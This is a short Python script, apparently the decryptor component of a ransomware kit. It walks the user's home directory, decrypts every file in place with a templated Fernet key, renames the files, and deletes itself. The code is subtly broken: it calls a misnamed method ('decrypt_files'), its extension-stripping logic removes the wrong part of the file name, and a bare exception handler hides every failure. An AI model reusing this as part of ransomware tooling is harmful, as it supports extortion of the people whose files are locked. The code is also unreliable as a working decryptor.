import os
from cryptography.fernet import Fernet
from pathlib import Path

class Decrypter:
    def __init__(self,key) -> None:
        self.home_dir = str(Path.home())
        self.key = key

    def decrypt_file(self,file):
        with open(file,'rb')as file_read:
            encrypted_contents =  file_read.read()
            file_read.close()

        with open(file,'wb') as file_write:   
            self.fernet = Fernet(self.key)
            decrypted_content = self.fernet.decrypt(encrypted_contents)
            file_write.write(decrypted_content)
            file_write.close()

    def change_extension(self,file):
        extension = file.split('.')[-2]
        new_name = file.replace(f".{extension}",'')
        os.rename(file,new_name)

    def start(self):
        for rootdir, dirs, files in os.walk(self.home_dir):
            for subdir in dirs:
                dir = os.path.join(rootdir, subdir)
                try:
                    os.chdir(dir)
                    for files in os.listdir(dir):
                            if os.path.isfile(files) == True:
                                if "." in files:
                                    self.decrypt_files(files)
                                    self.change_extension(files)
                except:
                    continue        
        os.remove(os.path.basename(__file__))

Decrypter({Key}).start()
